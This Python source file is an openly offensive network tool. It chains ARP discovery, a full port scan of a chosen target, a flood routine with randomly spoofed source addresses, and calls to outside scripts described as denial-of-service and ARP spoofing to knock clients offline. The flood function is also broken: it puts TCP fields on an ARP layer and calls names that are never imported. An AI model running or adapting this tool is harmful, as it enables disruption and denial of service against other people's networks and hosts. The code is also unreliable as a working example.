import re 
import sys 
import scapy.all as scapy
import os 
import time as t 
import socket 
import colorama 
import psutil
from colorama import Fore 
from colorama import init
import datetime 
import pyfiglet 
from datetime import datetime
import subprocess
from os import system
from sys import stdout

init()


def oscheck(): # check the os's system name since this script and other scripts are primary to just linux
    t.sleep(1)
    if sys.platform == 'linux':
        print(Fore.GREEN+"Your system is compatible conitnuing to script ")
    if sys.platform == 'win32':
        print(Fore.RED+"Sorry your system doesnt seem to compatible but just might be")
        A = str(input(" Would you like to continue anyway? n/Y ===> "))

        if 'n' in A:
            t.sleep(1)
            os.system('cls')
            print("Okay have a nice one!")
            sys.exit()
        
        elif 'Y' == A:
            t.sleep(1)
            print(" okay continuing! ")
            t.sleep(1)
            os.system('cls')
    if sys.platform == 'win64':
        print(Fore.RED+"Sorry your system doesnt seem to compatible but just might be")
        A = str(input(" Would you like to continue anyway? n/Y ===> "))

        if 'n' in A:
            t.sleep(1)
            os.system('cls')
            print("Okay have a nice one!")
            sys.exit()
        
        elif 'Y' == A:
            t.sleep(1)
            print(" okay continuing! ")
            t.sleep(1)
            os.system('cls')

def linesep():
    print(Fore.RED+"")
    print("[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]")

def exit():
    print("[!] Exiting [!] ")
    sys.exit()

def checkinter():
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    # No adapter above wlan0 is connected
    if len(check_wifi_result) == 0:
        print("Please connect a WiFi adapter and try again.")
        exit()

def check():
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()

def CS(X): # variable X to combine clear and sleep
    t.sleep(X)
    os.system('clear')

def seperator():
    print(Fore.RED+"") # seperation block for neatness 
    print("""
    --------------------------------------
    |                                    |
    |           Arp scan completed       |
    |------------------------------------|
    |                                    |
    |          moving to Port Scan       |
    |------------------------------------|
    """)

def emoji():
    import emoji
    print(emoji.emojize(":winking_face_with_tongue:"))

def bannerarp(): # banner for the arp DDOSING and spoofing 
    CS(2)
    print(Fore.RED+"")
    print("""
_______                                           
|   _   |.----..-----..--.--. ______ .-----..--.--.
|       ||   _||  _  ||  |  ||______||  _  ||  |  |
|___|___||__|  |   __||___  |        |   __||___  |
               |__|   |_____|        |__|   |_____|

|-----|
|V-1.0|     AHHHHH STEPPPP BROOOO \033[33m 😜 
|-----|                    """,)

def banner():
    CS(2)
    print(Fore.RED+"")
    print("""
.-----..----..---.-..-----. ______ .-----..--.--.
|__ --||  __||  _  ||     ||______||  _  ||  |  |
|_____||____||___._||__|__|        |   __||___  |
                                   |__|   |_____|
                                   
                                   ____________
                                   | V 1.0    |
                                   |----------|
                                   | Arp scan |
                                   | discover |
                                   | attack   |
                                   |----------|
-----------------------------------------------------
""")


def cpu_usage():
    t.sleep(1)
    print("------------------------------cpu usage las recorded while using this script -------------------------------------")
    t.sleep(1)
    print(" first im going to show the information about then the usage ")
    print("Physical cores:", psutil.cpu_count(logical=False))
    t.sleep(0.1)
    print("Total Cores:", psutil.cpu_count(logical=True))
    cpufreq = psutil.cpu_freq()
    t.sleep(0.1)
    print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    t.sleep(0.1)
    print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    t.sleep(0.1)
    print(f"CUrrent Frequency: {cpufreq.current:.2f}Mhz")
    t.sleep(0.1)
    print(" ------------------------------CPU USAGE OVER TIME OF THIS SCRIPT-------------------------------------------")
    print("------------------------------------------------------------------------------------------------------------")
    print("CPU Usage Per Core:")
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        print(f"Core {i}: {percentage}%")
    t.sleep(0.1)
    print(f"Total CPU Usage: {psutil.cpu_percent()}%") 
    t.sleep(1.5)

def scan1():
    ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
    while True:
        print(Fore.RED+"")
        t.sleep(2)
        print("----------------------------------------------------------------")
        t.sleep(0.1)
        print(" MAKE SURE ITS A RANGE (ex 192.168.1.0/24) ")
        t.sleep(0.1)
        print(" MAKE SURE YOU RAN THIS PROGRAM AS ROOT ")
        t.sleep(0.1)
        print(" MAKE SURE YOU ARE ON THE CURRENT NETWORK ")
        t.sleep(0.1)
        print(" MAKE SURE YOU HAVE PREMISSION TO DO THIS ")
        t.sleep(0.1)
        print("----------------------------------------------------------------")
        ip_add_range_entered = input("\nIPA to send ARP to ==> ")
        if ip_add_range_pattern.search(ip_add_range_entered):
            print(f"{ip_add_range_entered} is a valid IP range")
            break
    print(Fore.GREEN+"")
    arp_result = scapy.arping(ip_add_range_entered)
    
    A = str(input(" Would you like to run extra scans? [y/N] ===> "))
    linesep()
    
    if 'N' in A:
        t.sleep(1)
        print("\n[*] Okay Continuing [*]")
    
    if 'y' in A:
        t.sleep(1)
        os.system('sudo arp-scan -l -W scan.pcap')
        os.system('tshark -r scan.pcap')



def interfacescan():
    import psutil
    from tabulate import tabulate

    class InterfaceScanner(object):
        def __init__(self):
            self.instance = psutil.net_if_addrs()

        def scanner(self):
            self.interfaces = []
            self.address_ip = []
            self.netmask_ip = []
            self.broadcast_ip = []
            for interface_name, interface_addresses in self.instance.items():
                self.interfaces.append(interface_name)
                for address in interface_addresses:
                    if str(address.family) == 'AddressFamily.AF_INET':
                        self.address_ip.append(address.address)
                        self.netmask_ip.append(address.netmask)
                        self.broadcast_ip.append(address.broadcast)
            data = {"Interface"    : [*self.interfaces],
                    "IP-Address"   : [*self.address_ip],  
                    "Netmask"      : [*self.netmask_ip],
                    "Broadcast-IP" : [*self.netmask_ip]
                    }
            return tabulate(data, headers="keys", tablefmt="github")

        def __str__(self):
            return str(self.scanner())

    if __name__ == "__main__":
        print(Fore.BLUE+"")
        print("---------------------You're interfaces--------------------------")
        t.sleep(0.1)
        print(InterfaceScanner())

def port_scan():
    seperator()
    print(Fore.BLUE+"")
    print(Fore.RED+"what IPA would you like to port scan ")
    target = str(input("Target ====> "))
    print("-"*80)
    print('please wait scanning host', target, 'At date-time ==> ' + str(datetime.now()))
    print("-"*80)
    t1 = datetime.now()
    try:
        for port in range(1,65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((target,port))
            if result ==0: # number color format print(Fore.RED+" isnt avalible for str and multiple brackets and variables")
                timescan = '[DATA] At ==>' + str(datetime.now())
                print(timescan)
                print("----------------------------------------------------------------------------------------------")
                print("\033[35m Port ===> \033[36m [\033[35m {} \033[36m ] \033[35m Appears To Be Open".format(port))
                print("----------------------------------------------------------------------------------------------")
                s.close()#finally fucking close it after spending hours on color format just to find out like rust you forgot a ; that messed the enteire script up
    except KeyboardInterrupt: # instead of it being a damn semi colon you forgot to put fucking m SMH FML(programmer rage)
        linesep()
        t.sleep(1)
        print(" [!] EXITING [!]")
        t.sleep(1)
    except socket.gaierror:
        print("\n [!]Hostname Could Not Be Resolved[!]")
        sys.exit()
    except socket.error:
        t.sleep(1)
        print("\n Server is not giving resposes[!]")
        sys.exit()
    except NameError:
        os.system(' clear ')
        t.sleep(1)
        print(" [!] TARGET WAS NOT DEFINED ")
        print(" [!] try a target like 127.0.0.1 ")

def arp1():

    def randomIP():
        ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
        return ip

    def randInt():
        x = randint(1000,9000)
        return x

    def TCP_Flood(dstIP,dstPort,counter):
        total = 0
        print ("ARPY Hammering ")
        for x in range (0,counter):
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()

            IP_Packet = IP ()
            IP_Packet.src = randomIP()
            IP_Packet.dst = dstIP

            ARP_Packet = ARP ()
            ARP_Packet.sport = s_port
            ARP_Packet.dport = dstPort
            ARP_Packet.flags = "S"
            ARP_Packet.seq = s_eq
            ARP_Packet.window = w_indow

            send(IP_Packet/ARP_Packet, verbose=0)
            total+=1

        stdout.write("\nTotal packets sent: %i\n" % total)


    def info():
        print("-----------------------------")
        dstIP = input ("\nTarget IP   ===>  ")
        print("-----------------------------")
        dstPort = input ("Target Port ===>  ")
        return dstIP,int(dstPort)


    def main():
        dstIP,dstPort = info()
        counter = input ("How many packets do you want to send : ")
        TCP_Flood(dstIP,dstPort,int(counter))

    main()

def UDP1():
    print(Fore.MAGENTA+"")
    os.system('sudo python A.py')
    print(Fore.BLUE+"")
    print(" ------------------------------------------------------------------------")
    print(" [DATA] -- Denial of service stopped at ===> " + str(datetime.now()))
    print(" ------------------------------------------------------------------------")
    print(" I hope i was able to help, thanks for stopping by! have a nice one :D ")

def spoofie():
    A = str(input(" Would you like to Arp-Spoof clients offline? [y/N]==> "))

    if 'N' in A:
        t.sleep(1)
        print(" [*] this is the end of script i hope ")
        print(" [*] this was able to help, goodbye!   ")

    elif 'y' == A:
        t.sleep(1)
        print(" [!] Clearning screen in ")
        t.sleep(1)
        print("1")
        t.sleep(1)
        print("2")
        t.sleep(1)
        print("3")
        CS(2)
        bannerarp()
        print(" A == IP | B == website ")
        arp = str(input(" is your host a website or a IP ==> "))

        if 'A' in arp:
            t.sleep(1)
            print(" scanning the network again since terminal was cleared ")
            CS(2)
            check()
            checkinter()
            bannerarp()
            linesep()
            scan1()
            interfacescan()
            port_scan()
            os.system('sudo python3 i.py')
        
        if 'B' in arp:
            t.sleep(1)
            CS(2)
            print(" Scanning again since terminal was cleared ")
            check()
            checkinter()
            bannerarp()
            linesep()
            interfacescan()
            port_scan()
            UDP1()


if __name__ == '__main__':
    oscheck()
    t.sleep(1)
    os.system('clear')
    banner()
    check()
    checkinter()
    interfacescan() 
    spoofie()
    UDP1()
    cpu_usage()

